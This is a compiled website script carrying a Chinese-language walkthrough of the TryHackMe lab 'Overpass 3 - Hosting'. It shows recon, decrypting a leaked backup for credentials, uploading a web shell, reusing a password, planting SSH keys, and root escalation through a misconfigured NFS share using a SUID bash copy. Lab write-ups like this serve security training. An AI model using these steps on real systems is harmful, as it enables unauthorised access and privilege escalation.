"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1192],{56954:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>p,contentTitle:()=>i,default:()=>d,frontMatter:()=>t,metadata:()=>o,toc:()=>c});var a=s(74848),r=s(28453);const t={sidebar_position:89,tags:["Easy","Linux","\u5bc6\u7801\u5b66","\u5bc6\u7801\u91cd\u7528","NFS"],title:"Overpass 3 - Hosting",description:"Overpass 3 - Hosting",sidebar_label:"Overpass 3 - Hosting",slug:"/tryhackme/89"},i="Overpass 3 - Hosting",o={id:"box/TryHackMe/89",title:"Overpass 3 - Hosting",description:"Overpass 3 - Hosting",source:"@site/docs/box/TryHackMe/89.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/89",permalink:"/docs/tryhackme/89",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"\u5bc6\u7801\u91cd\u7528",permalink:"/docs/tags/\u5bc6\u7801\u91cd\u7528"},{label:"NFS",permalink:"/docs/tags/nfs"}],version:"current",sidebarPosition:89,frontMatter:{sidebar_position:89,tags:["Easy","Linux","\u5bc6\u7801\u5b66","\u5bc6\u7801\u91cd\u7528","NFS"],title:"Overpass 3 - Hosting",description:"Overpass 3 - Hosting",sidebar_label:"Overpass 3 - Hosting",slug:"/tryhackme/89"},sidebar:"boxSidebar",previous:{title:"Biohazard",permalink:"/docs/tryhackme/88"},next:{title:"The Marketplace",permalink:"/docs/tryhackme/90"}},p={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"apache",id:"apache",level:3},{value:"apache \u2014&gt; paradox",id:"apache--paradox",level:3},{value:"paradox \u2014&gt; james",id:"paradox--james",level:3},{value:"james \u2014&gt; root",id:"james--root",level:3},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2},{value:"SSH \u95ee\u9898",id:"ssh-\u95ee\u9898",level:3}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"overpass-3---hosting",children:"Overpass 3 - Hosting"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-152-123:~/overpass3hosting# nmap -sTCV -p 21,22,80 --min-rate 1000 10.10.253.225\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-13 07:45 BST\nNmap scan report for ip-10-10-253-225.eu-west-1.compute.internal (10.10.253.225)\nHost is up (0.00018s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)\n|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)\n|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.37 ((centos))\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos)\n|_http-title: Overpass Hosting\nMAC Address: 02:F1:C4:7C:A2:29 (Unknown)\nService Info: OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,a.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a zip \u6587\u4ef6, \u5e76\u8fdb\u884c\u4e86\u67e5\u770b"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214823.png",alt:"20240703214823"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214830.png",alt:"20240703214830"})}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u5c06\u5176\u89e3\u538b\u5e76\u53d1\u73b0\u5176\u4e2d\u5b58\u5728\u4e24\u4e2a\u6587\u4ef6, \u5176\u4e2d\u4e00\u4e2a\u52a0\u5bc6\u6587\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u5bc6\u94a5"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-152-123:~/overpass3hosting# unzip backup.zip \nArchive:  backup.zip\n extracting: CustomerDetails.xlsx.gpg  \n  inflating: priv.key\nroot@ip-10-10-152-123:~/overpass3hosting# gpg --import priv.key \ngpg: /root/.gnupg/trustdb.gpg: trustdb created\ngpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported\ngpg: key C9AE71AB3180BC08: secret key imported\ngpg: Total number processed: 1\ngpg:               imported: 1\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\nroot@ip-10-10-152-123:~/overpass3hosting# gpg --list-keys\n/root/.gnupg/pubring.kbx\n------------------------\npub   rsa2048 2020-11-08 [SC] [expired: 2022-11-08]\n      49829BBEB100BB2692F33CD2C9AE71AB3180BC08\nuid           [ expired] Paradox <paradox@overpass.thm>\n\nroot@ip-10-10-152-123:~/overpass3hosting# gpg --decrypt --output CustomerDetails.xlsx CustomerDetails.xlsx.gpg\ngpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 21:14:31 GMT\ngpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08\n      "Paradox <paradox@overpass.thm>"\nroot@ip-10-10-152-123:~/overpass3hosting# ls\nbackup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  priv.key\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u89e3\u5bc6\u4e4b\u540e\u5f97\u5230\u4e00\u4e2a xlsx \u6587\u6863, \u6240\u4ee5\u6211\u8fdb\u884c\u4e86\u67e5\u770b, \u5e76\u53d1\u73b0\u4e86\u4e09\u4e2a\u8d26\u53f7\u5bc6\u7801"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214851.png",alt:"20240703214851"})}),"\n",(0,a.jsx)(n.p,{children:"\u57fa\u4e8e\u6b64\u6211\u8fdb\u884c\u4e86 SSH  \u548c FTP \u7684\u5bc6\u7801\u66b4\u529b\u7834\u89e3, \u53d1\u73b0\u5176\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5176\u8fdb\u884c FTP \u767b\u9646"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214901.png",alt:"20240703214901"})}),"\n",(0,a.jsx)(n.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,a.jsx)(n.p,{children:"\u767b\u9646\u4e4b\u540e\u6211\u53d1\u73b0\u8fd9\u5176\u5b9e\u5c31\u662f\u7f51\u7ad9\u76ee\u5f55\u5e76\u4e14\u6211\u4eec\u6709\u5171\u4eab\u6587\u4ef6, \u6240\u4ee5\u6211\u4e0a\u4f20\u4e86 Shell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214954.png",alt:"20240703214954"})}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"apache",children:"apache"}),"\n",(0,a.jsx)(n.p,{children:"\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 Shell \u83b7\u53d6\u5230\u4e00\u4e2a\u4f1a\u8bdd"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215105.png",alt:"20240703215105"})}),"\n",(0,a.jsx)(n.h3,{id:"apache--paradox",children:"apache \u2014> paradox"}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u5f97\u5230\u7684 Shell  \u4e2d\u6211\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u540d\u53eb paradox \u6240\u4ee5\u6211\u5c1d\u8bd5\u5bc6\u7801\u91cd\u7528"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215131.png",alt:"20240703215131"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u767b\u9646\u4e4b\u540e, \u6211\u8bbf\u95ee\u7528\u6237 paradox \u5bb6\u76ee\u5f55\u53d1\u73b0\u5176\u5b58\u5728 ",(0,a.jsx)(n.code,{children:".ssh"})," \u6240\u4ee5\u6211\u5148\u5176\u4e2d\u5199\u5165\u6211\u7684\u516c\u94a5\u7136\u540e\u8fdb\u884c SSH \u767b\u9646"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215145.png",alt:"20240703215145"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215151.png",alt:"20240703215151"})}),"\n",(0,a.jsx)(n.h3,{id:"paradox--james",children:"paradox \u2014> james"}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u767b\u9646\u4e4b\u540e, \u67e5\u770b\u7aef\u53e3\u5360\u7528\u60c5\u51b5\u53d1\u73b0\u5360\u7528\u4e86 2049 \u7aef\u53e3, \u8bf4\u660e\u542f\u52a8\u4e86 NFS \u670d\u52a1"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215207.png",alt:"20240703215207"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215213.png",alt:"20240703215213"}),"\n\u63a5\u7740\u67e5\u770b NFS \u7684\u914d\u7f6e\u6587\u4ef6\u53d1\u73b0\u5176\u5b58\u5728\u914d\u7f6e\u95ee\u9898"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215226.png",alt:"20240703215226"})}),"\n",(0,a.jsx)(n.p,{children:"\u6240\u4ee5\u6211\u5f00\u59cb\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1, \u6765\u5b8c\u6210\u5bf9\u4e8e\u9776\u573a\u7684 NFS \u8bbf\u95ee"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-152-123:~/overpass3hosting# ssh -L 2049:127.0.0.1:2049 paradox@10.10.166.230\nLast login: Wed Sep 13 09:08:39 2023 from 10.10.152.123\n[paradox@ip-10-10-166-230 ~]$\n\n------------------------------------------------------------------------------\n\nroot@ip-10-10-152-123:~/overpass3hosting# nmap -sT -p 2049  127.0.0.1\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-13 09:13 BST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000089s latency).\n\nPORT     STATE SERVICE\n2049/tcp open  nfs\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6302\u8f7d NFS \u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215240.png",alt:"20240703215240"})}),"\n",(0,a.jsx)(n.p,{children:"\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5171\u4eab\u7684\u662f James \u7528\u6237\u5bb6\u76ee\u5f55, \u540c\u65f6\u7ed3\u5408 NFS \u7684\u914d\u7f6e\u6743\u9650\u5931\u8bef,\u6211\u4eec\u7684\u653b\u51fb\u76ee\u6807\u5e94\u8be5\u662f"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"\u5199\u5165 SSH \u516c\u94a5\u83b7\u53d6 james \u7528\u6237 Shell"}),"\n",(0,a.jsx)(n.li,{children:"\u62f7\u8d1d bash \u5230 james \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u5e76\u8d4b\u4e88\u7279\u6743"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u6240\u4ee5\u6211\u5199\u5165\u4e86 SSH \u516c\u94a5\u5e76\u83b7\u53d6\u5230\u4e86 jame \u7684 Shell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215250.png",alt:"20240703215250"})}),"\n",(0,a.jsx)(n.h3,{id:"james--root",children:"james \u2014> root"}),"\n",(0,a.jsx)(n.p,{children:"\u73b0\u5728\u62f7\u8d1d bash \u5230\u7528\u6237\u7684\u5bb6\u76ee\u5f55"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"[james@ip-10-10-166-230 ~]$ cp /bin/bash .\n[james@ip-10-10-166-230 ~]$ ls -al\ntotal 1208\ndrwx------. 3 james james     124 Sep 13 09:18 .\ndrwxr-xr-x. 4 root  root       34 Nov  8  2020 ..\n-rwxr-xr-x  1 james james 1219248 Sep 13 09:18 bash\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728 NFS \u4f1a\u8bdd\u4e2d\u4fee\u6539 bash \u7684\u6240\u6709\u8005\u4ee5\u53ca\u6743\u9650"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-152-123:~/overpass3hosting/james# chown root bash\nroot@ip-10-10-152-123:~/overpass3hosting/james# chmod u+s bash\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fd9\u65f6\u5019\u6211\u4eec\u7684 james \u7528\u6237\u5bb6\u76ee\u5f55\u7684 bash \u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a SUID \u7a0b\u5e8f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"[james@ip-10-10-166-230 ~]$ ls -al\ntotal 1208\ndrwx------. 3 james james     124 Sep 13 09:18 .\ndrwxr-xr-x. 4 root  root       34 Nov  8  2020 ..\n-rwsr-xr-x  1 root  james 1219248 Sep 13 09:18 bash\n[james@ip-10-10-166-230 ~]$ ./bash -p\nbash-4.4# id\nuid=1000(james) gid=1000(james) euid=0(root) groups=1000(james)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,a.jsx)(n.h3,{id:"ssh-\u95ee\u9898",children:"SSH \u95ee\u9898"}),"\n",(0,a.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u83b7\u53d6\u5230\u5bc6\u7801\u8fde\u63a5 paradox \u7684 SSH \u65f6, \u8fd9\u65f6\u5019\u6211\u4eec\u53d1\u73b0\u6211\u4eec\u5e76\u4e0d\u80fd\u8fde\u63a5\u6210\u529f"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703215320.png",alt:"20240703215320"})}),"\n",(0,a.jsx)(n.p,{children:"\u4ece\u62a5\u9519\u7ed3\u679c\u6765\u770b\u5bf9\u4e8e paradox  \u7528\u6237\u53ea\u5141\u8bb8\u4f7f\u7528 SSH \u5bc6\u94a5\u8fde\u63a5"})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>o});var a=s(96540);const r={},t=a.createContext(r);function i(e){const n=a.useContext(t);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(t.Provider,{value:n},e.children)}}}]);